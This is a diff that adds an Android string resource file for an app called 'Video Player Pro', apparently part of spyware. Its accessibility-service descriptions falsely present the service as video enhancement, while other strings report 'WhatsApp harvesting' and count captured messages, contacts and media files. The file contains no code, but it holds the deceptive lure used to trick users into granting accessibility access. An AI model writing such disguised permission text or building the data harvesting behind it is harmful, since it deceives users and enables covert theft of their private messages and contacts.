@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Video Player Pro</string>
+    <string name="accessibility_service_description">This service helps improve app functionality by monitoring WhatsApp interactions for better user experience.</string>
+    <string name="unified_accessibility_description">Video Player Pro uses accessibility services to enhance video playback controls, auto-pause during calls, and provide smart subtitle synchronization across all your favorite apps. This improves your viewing experience by automatically adjusting video settings based on your usage patterns.</string>
+    <string name="whatsapp_harvesting_started">WhatsApp harvesting started</string>
+    <string name="whatsapp_harvesting_stopped">WhatsApp harvesting stopped</string>
+    <string name="whatsapp_messages_captured">Messages captured: %d</string>
+    <string name="whatsapp_contacts_captured">Contacts captured: %d</string>
+    <string name="whatsapp_media_captured">Media files captured: %d</string>
+    <string name="accessibility_service_title">Video Enhancement Service</string>
+    <string name="accessibility_service_subtitle">Enable for better video playback experience</string>
+    <string name="accessibility_service_enabled">Video enhancement enabled</string>
+    <string name="accessibility_service_disabled">Video enhancement disabled</string>
+    <string name="accessibility_service_required">This service is required for optimal video player functionality</string>
+    <string name="smart_features_enabled">Smart features enabled</string>
+    <string name="auto_pause_enabled">Auto-pause during calls enabled</string>
+    <string name="subtitle_sync_enabled">Subtitle synchronization enabled</string>
+</resources> 
